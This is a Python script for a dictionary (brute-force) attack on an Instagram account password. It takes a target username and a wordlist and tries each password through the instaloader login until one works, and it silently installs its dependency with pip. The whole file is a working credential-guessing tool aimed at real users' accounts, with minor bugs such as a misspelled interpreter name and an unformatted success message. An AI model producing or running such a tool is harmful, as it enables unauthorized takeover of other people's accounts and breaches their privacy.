try:
    import instaloader as il,itertools as it,argparse,subprocess,sys,platform
except ModuleNotFoundError:
    import platform,subprocess,sys
    if platform.system == "Windows":
        pip_upgrade = subprocess.call(["pyhton.exe","-m","pip","install","--upgrade","pip"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        install_module = subprocess.call(["pip","install","instaloader"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        start_up = subprocess.call(["python",sys.argv[0],"-h"]) 
    else:
        pip_upgrade = subprocess.call(["python3","-m","pip","install","--upgrade","pip"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        install_module = subprocess.call(["pip","install","instaloader"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        start_up = subprocess.call(["python3",sys.argv[0],"-h"])

class Insta_Password_Attack:

    def __init__(self,username,wordlist):
        self.username = username
        self.wordlist = wordlist
        self.point = 0
        self.get_target= False
        self.cycle = it.cycle(r"/-\|")
        self.wordlist_len = 0
        for _ in open(self.wordlist,"r",encoding="utf-8").readlines():
            self.wordlist_len += 1

    def insta_login(self,password):
        try:
            il.Instaloader().login(self.username,password)
            return True
        except il.exceptions.BadCredentialsException:
            return False
        except il.exceptions.ConnectionException:
            return False

    def password_attack(self):

        for password in open(self.wordlist,"r",encoding="utf-8").readlines():
            self.point += 1
            sys.stdout.write("\r")
            sys.stdout.write(f"[*] Insta_Password_Attack <User> {self.username} / <Pass> {password} [{self.point} / {self.wordlist_len}] ~ {next(self.cycle)}")
            sys.stdout.flush()

            if self.insta_login(password) == True:
                sys.stdout.write("\n[+] Password -> {password}\n")
                sys.exit()
        if self.insta_login(password) == False:
            sys.stdout.write("\n[-] Password_Not_Found...\n")
            sys.exit()
            

def main():
    try:
        arg = argparse.ArgumentParser()
        arg.add_argument("-user",type=str,help="[+] Target_Uername / -user <target_username>")
        arg.add_argument("-woli",type=str,help="[+] WordList_Path / -woli <wordlist_path>")
        parse = arg.parse_args()
        Insta_Password_Attack(parse.user,parse.woli).password_attack()
    except KeyboardInterrupt:
        sys.stdout.write("\n[-] Stop_Password_Attack...\n")
        sys.exit()
    except TypeError:
        if platform.system() == "Windows":
           start_up = subprocess.call(["python",sys.argv[0],"-h"])
        else:
            start_up = subprocess.call(["python3",sys.argv[0],"-h"])

if __name__ == "__main__":
    main()  
